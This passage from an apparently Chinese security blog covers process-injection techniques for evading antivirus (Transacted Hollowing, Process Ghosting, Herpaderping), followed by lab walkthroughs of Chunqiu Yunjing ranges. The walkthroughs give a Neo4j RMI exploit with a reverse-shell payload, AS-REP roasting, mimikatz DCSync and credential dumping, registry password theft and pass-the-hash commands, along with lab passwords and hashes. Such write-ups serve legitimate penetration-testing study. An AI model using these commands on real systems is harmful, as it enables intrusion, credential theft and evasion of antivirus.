Doppelganging 的 事务特性 和 Process Hollowing 启动进程的便捷性，免去创建进程、准备进程参数的复杂过程，同Process Overwriting 也是解决内存中Private属性，项目：<a href=\"https://github.com/hasherezade/transacted_hollowing\">https://github.com/hasherezade/transacted_hollowing</a></p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建NTFS Transaction</p>\n</li>\n<li><p>在TxF中创建文件或者覆写文件，写入payload</p>\n</li>\n<li><p>通过文件句柄创建IMAGE SECTION</p>\n</li>\n<li><p>回滚NTFS Transaction</p>\n</li>\n<li><p>创建挂起的傀儡进程</p>\n</li>\n<li><p>将第三步创建的SECTION映射到傀儡进程中</p>\n</li>\n<li><p>修改傀儡进程PEB的ImageBase</p>\n</li>\n<li><p>修改傀儡进程的OEP</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903144723321.png\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903161453521.png\" alt=\"image-20240903161453521\"></p>\n<h1 id=\"Process-Ghosting\"><a href=\"#Process-Ghosting\" class=\"headerlink\" title=\"Process Ghosting*\"></a>Process Ghosting*</h1><p>一种 <strong>不涉及NTFS</strong> 的全新 “无文件” 手法，通过 <strong>设置删除标志位</strong>，写入payload映射到内存后自动删除，达到 “临时落地”，在此过程中，AV因为标志位的存在无法打开恶意文件进行检测，技术细节参看文章。</p>\n<p>文章：<a href=\"https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack\">https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack</a></p>\n<p>项目：<a href=\"https://github.com/hasherezade/process_ghosting\">https://github.com/hasherezade/process_ghosting</a></p>\n<p>流程如下：</p>\n<ul>\n<li><p>创建文件</p>\n</li>\n<li><p>设置文件句柄的 <strong>FILE_DISPOSITION_INFORMATION.DeleteFile = TRUE</strong></p>\n</li>\n<li><p>写入payload</p>\n</li>\n<li><p>通过文件句柄创建 IMAGE SECTION</p>\n</li>\n<li><p>关闭文件句柄，删除文件</p>\n</li>\n<li><p>通过Section创建进程，准备参数，写入PEB的ProcessParameters和Environment</p>\n</li>\n<li><p>创建主线程</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903171444583.png\" alt=\"image-20240903171444583\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903172037658.png\" alt=\"image-20240903172037658\"></p>\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903181301143.png\" alt=\"image-20240903181301143\"></p>\n<h1 id=\"Ghostly-Hollowing\"><a href=\"#Ghostly-Hollowing\" class=\"headerlink\" title=\"Ghostly Hollowing\"></a>Ghostly Hollowing</h1><p>与 Transacted Hollowing 类似，该方法也是为了免去了Process Ghosting创建进程和准备进程参数的复杂过程，项目代码在Transacted Hollowing中</p>\n<h1 id=\"Process-Herpaderping\"><a href=\"#Process-Herpaderping\" class=\"headerlink\" title=\"Process Herpaderping\"></a>Process Herpaderping</h1><p>该方法的原理、实现都和 <code>Ghosting</code>、<code>Doppelganging</code> 类似，项目：<a href=\"https://github.com/jxy-s/herpaderping\">https://github.com/jxy-s/herpaderping</a></p>\n<ul>\n<li>Ghosting 是删除文件</li>\n<li>Doppelganging 是替换文件的内容（不替换文件）</li>\n<li>Herpaderping 是替换文件和文件内容，其结果是反病毒软件检测执行的进程时，其打开的程序文件内容是我们设定的（比如lsass.exe，包括文件签名）</li>\n</ul>\n<p>流程如下：</p>\n<ul>\n<li>打开一个可读可写的文件</li>\n<li>向文件写入payload（calc.exe），创建section</li>\n<li>创建进程A（和Doppelganging一样，使用NtCreateProcessEx）</li>\n<li>向同一个文件写入伪装的程序，比如lsass.exe</li>\n<li>关闭并保存文件为output.exe（文件保存至磁盘，磁盘的内容是lsass.exe）</li>\n<li>准备进程参数，创建线程（这时payload开始执行）</li>\n</ul>\n<h1 id=\"对比表格\"><a href=\"#对比表格\" class=\"headerlink\" title=\"对比表格\"></a>对比表格</h1><p>针对：Hollowing 、Doppelgänging 、Herpaderping 、Ghosting 有如下对比表格，总的来说越来越隐蔽。</p>\n<table>\n<thead>\n<tr>\n<th>Type</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Hollowing</td>\n<td>map -&gt; modify section -&gt; execute</td>\n</tr>\n<tr>\n<td>Doppelgänging</td>\n<td>transact -&gt; write -&gt; map -&gt; rollback -&gt; execute</td>\n</tr>\n<tr>\n<td>Herpaderping</td>\n<td>write -&gt; map -&gt; modify -&gt; execute -&gt; close</td>\n</tr>\n<tr>\n<td>Ghosting</td>\n<td>delete pending -&gt; write -&gt; map -&gt; close(delete) -&gt; execute</td>\n</tr>\n</tbody></table>\n<h1 id=\"不常见的进程注入\"><a href=\"#不常见的进程注入\" class=\"headerlink\" title=\"不常见的进程注入\"></a>不常见的进程注入</h1><p>额外窗口内存注入，总体来说利用不稳定，在win10测试没有成功，就不再记录了，</p>\n<p><a href=\"https://www.crowdstrike.com/blog/through-window-creative-code-invocation/\">https://www.crowdstrike.com/blog/through-window-creative-code-invocation/</a></p>\n<p><a href=\"https://modexp.wordpress.com/2018/08/26/process-injection-ctray/\">https://modexp.wordpress.com/2018/08/26/process-injection-ctray/</a> </p>\n<p><a href=\"https://bbs.kanxue.com/thread-261451.htm\">Windows不太常见的进程注入学习小记（一）</a></p>\n<p><a href=\"https://bbs.kanxue.com/thread-261553.htm\">Windows不太常见的进程注入学习小记（二）</a></p>\n<p>利用blockdlls和ACG保护恶意进程</p>\n<p><a href=\"https://www.cnblogs.com/zha0gongz1/p/15391205.html\">玄 - 利用blockdlls和ACG保护恶意进程 - zha0gongz1 - 博客园 (cnblogs.com)</a></p>\n<p>Code injection series</p>\n<p><a href=\"https://blog.sevagas.com/?-Code-injection-series-&amp;lang=en\">https://blog.sevagas.com/?-Code-injection-series-&amp;lang=en</a></p>\n","categories":["Red-Team"]},{"title":"春秋云境-ThermalPower","url":"/2025/05/20/ThermalPower/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/330c11eeec3775fa44ee7ac3d8fe23b5.png\" style=\"zoom:67%;\" />\n\n\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.17.213</td>\n<td>security</td>\n<td>spring + shiro</td>\n</tr>\n<tr>\n<td>172.22.17.6</td>\n<td>WIN-ENGINEER</td>\n<td>SCADA 工程师的个人 PC</td>\n</tr>\n<tr>\n<td>172.22.26.11</td>\n<td>WIN-SCADA</td>\n<td>SCADA 工程师站</td>\n</tr>\n</tbody></table>\n<h1 id=\"shiro\"><a href=\"#shiro\" class=\"headerlink\" title=\"shiro\"></a>shiro</h1><p>/actuator/heapdump + shiro</p>\n<h1 id=\"密码信息\"><a href=\"#密码信息\" class=\"headerlink\" title=\"密码信息\"></a>密码信息</h1><p>172.22.17.6:80 泄露敏感信息文档：chenhua/chenhua@0813，登录172.22.17.6发现是Backup Operators 组成员，但是并没有给用户默认分配 SeBackup 权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\chenhua&gt;whoami &#x2F;groups</span><br><span class=\"line\"></span><br><span class=\"line\">组信息</span><br><span class=\"line\">-----------------</span><br><span class=\"line\"></span><br><span class=\"line\">组名                                   类型   SID          属性</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\">Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">BUILTIN\\Backup Operators               别名   S-1-5-32-551 只用于拒绝的组</span><br><span class=\"line\">BUILTIN\\Remote Desktop Users           别名   S-1-5-32-555 必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">BUILTIN\\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\REMOTE INTERACTIVE LOGON  已知组 S-1-5-14     必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\本地帐户                  已知组 S-1-5-113    必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">NT AUTHORITY\\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组</span><br><span class=\"line\">Mandatory Label\\Medium Mandatory Level 标签   S-1-16-8192</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\chenhua&gt;whoami &#x2F;priv</span><br><span class=\"line\"></span><br><span class=\"line\">特权信息</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">特权名                        描述           状态</span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\">SeChangeNotifyPrivilege       绕过遍历检查   已启用</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用</span><br></pre></td></tr></table></figure>\n\n<p>（复现失败）导入两个dll：<a href=\"https://github.com/k4sth4/SeBackupPrivilege\">https://github.com/k4sth4/SeBackupPrivilege</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\chenhua\\Desktop&gt; Import-Module .\\SeBackupPrivilegeUtils.dll</span><br><span class=\"line\">PS C:\\Users\\chenhua\\Desktop&gt; Import-Module .\\SeBackupPrivilegeCmdLets.dll</span><br><span class=\"line\">PS C:\\Users\\chenhua\\Desktop&gt; Set-SeBackupPrivilege</span><br><span class=\"line\">PS C:\\Users\\chenhua\\Desktop&gt; Get-SeBackupPrivilege</span><br><span class=\"line\">SeBackupPrivilege is disabled</span><br></pre></td></tr></table></figure>\n\n<p>（复现失败）reg抓密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg save hklm\\sam sam.hive</span><br><span class=\"line\">错误:客户端没有所需的特权。</span><br></pre></td></tr></table></figure>\n\n<p>（复现失败）<a href=\"https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1\">https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module .\\EnableSeBackupPrivilege.ps1</span><br><span class=\"line\">调试:</span><br><span class=\"line\"> using System;</span><br><span class=\"line\"> using System.Diagnostics;</span><br><span class=\"line\"> using System.Runtime.InteropServices;</span><br><span class=\"line\"> using System.Security.Principal;</span><br><span class=\"line\"></span><br><span class=\"line\"> [StructLayout(LayoutKind.Sequential, Pack &#x3D; 1)]</span><br><span class=\"line\"> public struct TokPriv1Luid</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  public int Count;</span><br><span class=\"line\">  public long Luid;</span><br><span class=\"line\">  public int Attr;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> public static class Advapi32</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  [DllImport(&quot;advapi32.dll&quot;, SetLastError&#x3D;true)]</span><br><span class=\"line\">  public static extern bool OpenProcessToken(</span><br><span class=\"line\">   IntPtr ProcessHandle,</span><br><span class=\"line\">   int DesiredAccess,</span><br><span class=\"line\">   ref IntPtr TokenHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">  [DllImport(&quot;advapi32.dll&quot;, SetLastError&#x3D;true)]</span><br><span class=\"line\">  public static extern bool LookupPrivilegeValue(</span><br><span class=\"line\">   string lpSystemName,</span><br><span class=\"line\">   string lpName,</span><br><span class=\"line\">   ref long lpLuid);</span><br><span class=\"line\"></span><br><span class=\"line\">  [DllImport(&quot;advapi32.dll&quot;, SetLastError &#x3D; true)]</span><br><span class=\"line\">  public static extern bool AdjustTokenPrivileges(</span><br><span class=\"line\">   IntPtr TokenHandle,</span><br><span class=\"line\">   bool DisableAllPrivileges,</span><br><span class=\"line\">   ref TokPriv1Luid NewState,</span><br><span class=\"line\">   int BufferLength,</span><br><span class=\"line\">   IntPtr PreviousState,</span><br><span class=\"line\">   IntPtr ReturnLength);</span><br><span class=\"line\"></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> public static class Kernel32</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">  [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class=\"line\">  public static extern uint GetLastError();</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">调试: Current process handle: 2112</span><br><span class=\"line\">调试: Calling OpenProcessToken()</span><br><span class=\"line\">调试: Token handle: 2136</span><br><span class=\"line\">调试: Calling LookupPrivilegeValue for SeBackupPrivilege</span><br><span class=\"line\">调试: SeBackupPrivilege LUID value: 17</span><br><span class=\"line\">调试: Calling AdjustTokenPrivileges</span><br><span class=\"line\">调试: GetLastError returned: 1300</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>管理员权限运行cmd即可复现</p>\n</blockquote>\n<h1 id=\"SCADA\"><a href=\"#SCADA\" class=\"headerlink\" title=\"SCADA\"></a>SCADA</h1><p>SCADA.txt发现管理员密码，还有一个新网段，扫描rdp登录172.22.26.11，启动锅炉</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">WIN-SCADA: 172.22.26.xx</span><br><span class=\"line\">Username: Administrator</span><br><span class=\"line\">Password: IYnT3GyCiy3</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"勒索病毒解密\"><a href=\"#勒索病毒解密\" class=\"headerlink\" title=\"勒索病毒解密\"></a>勒索病毒解密</h1><p>一个aes解密就行了</p>\n","categories":["云境靶场"]},{"title":"春秋云境-Time","url":"/2025/03/01/Time/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/abf0ae96da9d4223316eacb0d478efc4.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、域用户枚举 (Kerberos Domain User Enumeration)    </p>\n<p><a href=\"https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article1/index.html\">域内用户名枚举</a>：在 Kerberos 协议认证的 AS-REQ 阶段，请求包 cname 值是用户名，<strong>当用户名存在、用户存在但禁用、用户不存在时，AS-REP 返回包状态不同。</strong></p>\n<table>\n<thead>\n<tr>\n<th>AS-REP 回复包状态</th>\n<th>Kerberos 错误信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>用户存在 且启用</td>\n<td>KDC_ERR_PREAUTH_REQUIRED (需要额外的预认证)</td>\n</tr>\n<tr>\n<td>用户存在 但禁用</td>\n<td>KDC_ERR_CLIENT_REVOKED NT Status： STATUS_ACCOUNT_DISABLED (用户状态不可用)</td>\n</tr>\n<tr>\n<td>用户不存在</td>\n<td>KDC_ERR_C_PRINCIPAL_UNKNOWN (找不到此用户)</td>\n</tr>\n</tbody></table>\n<p>二、 AS-REP Roasting</p>\n<p><a href=\"https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article3/index.html\">AS-REP Roasting 攻击</a>：是一种对用户账号进行离线爆破的攻击方式。该攻击方式利用前提需要用户账号设置 “不要求 kerberos 预身份验证” 选项 ，该选项默认未设置。<strong>Kerberos 预身份验证发送在 Kerberos 身份验证的第一阶段(AS_REQ &amp; AS_REP)，它的主要作用是防止密码离线爆破。</strong>默认情况下，预身份验证是开启的，KDC 会记录密码错误次数，防止在线爆破。</p>\n<p>但是当关闭了预身份验证后，攻击者可以使用指定用户向域控的 Kerberos 88端口去请求票据，<strong>此时域控不会作任何验证就将 TGT 认购权证 和 该用户Hash加密的 Login Session Key 返回。</strong>因此攻击者就可以对获取到的Login Session Key 进行离线破解。</p>\n<p>三、windows自动登录凭据收集 (AutoLogon credentials)</p>\n<p><code>reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;</code></p>\n<p>四、SID History利用</p>\n<p>SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。</p>\n<p>SID History是一个用于支持迁移方案的属性：如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，这就导致迁移后的用户不能访问本来可以访问的资源。</p>\n<p>SID History解决了该问题，其作用就是在 <strong>域迁移过程中保持域用户的访问权限</strong>，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p>\n<p>攻击思路：</p>\n<ol>\n<li><p>给域内低权限用户配置SIDHistory让其拥有域控权限，用作权限维持。</p>\n</li>\n<li><p>渗透测试的途中发现某个用户的SIDHistory是高权限的sid，那么这个用户就直接具有了高权限。</p>\n</li>\n</ol>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.6.36</th>\n<th>ubuntu</th>\n<th>外网 Neo4j 服务器</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.6.38</td>\n<td></td>\n<td>内网后台登录界面，SQL注入</td>\n</tr>\n<tr>\n<td>172.22.6.25</td>\n<td>WIN2019.xiaorang.lab</td>\n<td>域内主机</td>\n</tr>\n<tr>\n<td>172.22.6.12</td>\n<td>DC-PROGAME.xiaorang.lab</td>\n<td>域控制器</td>\n</tr>\n</tbody></table>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p>neo4j rmi反序列化，CVE-2021-34371</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar rhino_gadget.jar rmi:&#x2F;&#x2F;39.99.142.158:1337 &quot;bash -c &#123;echo,..&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p>内网登录界面存在sql注入可以获取到一些域内用户名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105173248426.png\" alt=\"image-20250105173248426\"></p>\n<p>这里 可以先尝试枚举出域内有效用户再进行ASREPRoasting，也可以直接进行ASREPRoasting</p>\n<p>用户枚举：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerbrute_windows_amd64.exe userenum --dc 172.22.6.12 -d xiaorang.lab usernames.txt -t 10 -o output.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105175130400.png\" alt=\"image-20250105175130400\"></p>\n<p>ASREPRoasting：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-GetNPUsers xiaorang.lab&#x2F; -dc-ip 172.22.6.12 -usersfile user.txt -format hashcat -outputfile hashes.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105175218080.png\" alt=\"image-20250105175218080\"></p>\n<p>本地解密hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 18200 hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --show</span><br></pre></td></tr></table></figure>\n\n<p>得到两个域用户凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xiaorang.lab\\wenshao\thellokitty</span><br><span class=\"line\">xiaorang.lab\\zhangxin\tstrawberry</span><br></pre></td></tr></table></figure>\n\n<p>通过枚举喷洒进行横向成功登录WIN2019</p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p>通过在WIN2019上信息收集，发现存在 <a href=\"mailto:&#x59;&#85;&#x58;&#85;&#65;&#78;&#64;&#88;&#73;&#x41;&#79;&#x52;&#65;&#78;&#71;&#46;&#x4c;&#65;&#66;\">&#x59;&#85;&#x58;&#85;&#65;&#78;&#64;&#88;&#73;&#x41;&#79;&#x52;&#65;&#78;&#71;&#46;&#x4c;&#65;&#66;</a> 会话，且YUXUAN设置了自动登录，通过注册表获取其密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105182529143.png\" alt=\"image-20250105182529143\"></p>\n<p>通过BloodHound或者powerview查询到域内具有sidhistory属性的用户，发现域用户 YUXUAN 在其 SIDHistory 属性中具有域管理员 ADMINISTRATOR 的 SID</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class=\"line\">. .\\PowerView.ps1</span><br><span class=\"line\">Get-DomainUser | select sidhistory,cn</span><br></pre></td></tr></table></figure>\n\n<p>所以直接通过YUXUAN 的凭据可以横向域控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;yuxuan:Yuxuan7QbrgZ3L@172.22.6.12 -codec gbk</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105183035180.png\" alt=\"image-20250105183035180\"></p>\n<p>开启winrm，利用evil-winrm或者smbclient上传mimikatz</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105184308138.png\" alt=\"image-20250105184308138\"></p>\n<p>mimikatz dump hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105184526825.png\" alt=\"image-20250105184526825\"></p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p>域管hash横向2019</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 -codec gbk</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250105184929115.png\" alt=\"image-20250105184929115\"></p>\n","categories":["云境靶场"]},{"title":"春秋云境-Tsclient","url":"/2025/03/01/Tsclient/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/8e097482160b0bc707e08bcf2fab5a5f.png\" style=\"zoom:67%;\" />\n\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、mstsc/RDP 反向攻击</p>\n<p><a href=\"https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg\">利用 mstsc 反向攻击思路整理</a> 、<a href=\"https://www.c0bra.xyz/2021/01/11/RDP%E5%8F%8D%E5%90%91%E6%94%BB%E5%87%BB/\">RDP反向攻击</a> 、<a href=\"https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/\">红蓝对抗中 RDP 协议的利用</a></p>\n<p>二、远程重置过期密码</p>\n<blockquote>\n<p>当过期密码尝试连接SMB服务时，会返回错误 STATUS_PASSWORD_MUST_CHANGE （0xC0000224），这时可以启动空会话并通过 MS-SAMR 协议上的 DCE/RPC 调用 SamrUnicodeChangePasswordUser2 函数来更改密码</p>\n</blockquote>\n<p><a href=\"https://forum.butian.net/share/865\">红队技巧-远程重置过期密码</a> 、<a href=\"https://snovvcrash.rocks/2020/10/31/pretending-to-be-smbpasswd-with-impacket.html\">Pretending to Be smbpasswd with impacket</a></p>\n<p>三、IFEO映像劫持 提权</p>\n<p><a href=\"https://www.freebuf.com/articles/system/321211.html\">映像劫持的几种利用方式</a> 、<a href=\"https://www.freebuf.com/articles/terminal/245879.html\">逆向分析微软IFEO镜像劫持从ring3到ring0的实现机理</a> 、<a href=\"https://www.cnblogs.com/HsinTsao/p/6666401.html\">IFEO 映像文件劫持</a></p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.8.18</th>\n<th>WIN-WEB</th>\n<th>外网 MSSQL 数据库服务器</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.8.31</td>\n<td>WIN19-CLIENT.XIAORANG.LAB</td>\n<td>john 用户的 RDP 客户端电脑</td>\n</tr>\n<tr>\n<td>172.22.8.46</td>\n<td>WIN2016.XIAORANG.LAB</td>\n<td>Domain Admins 组中的主机</td>\n</tr>\n<tr>\n<td>172.22.8.15</td>\n<td>DC01.XIAORANG.LAB</td>\n<td>域控</td>\n</tr>\n</tbody></table>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p>mssql弱口令 -&gt; potato提权</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241224215901882.png\" alt=\"image-20241224215901882\"></p>\n<p>抓密码hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">User : Administrator</span><br><span class=\"line\">2caf35bb4c5059a3d50599844e2b9b1f</span><br><span class=\"line\"></span><br><span class=\"line\">User : John</span><br><span class=\"line\">eec9381b043f098b011be51622282027</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p>查询当前数据库机器上的会话，存在John用户正在登录，从内网的172.22.8.31连接过来</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250102215350055.png\" 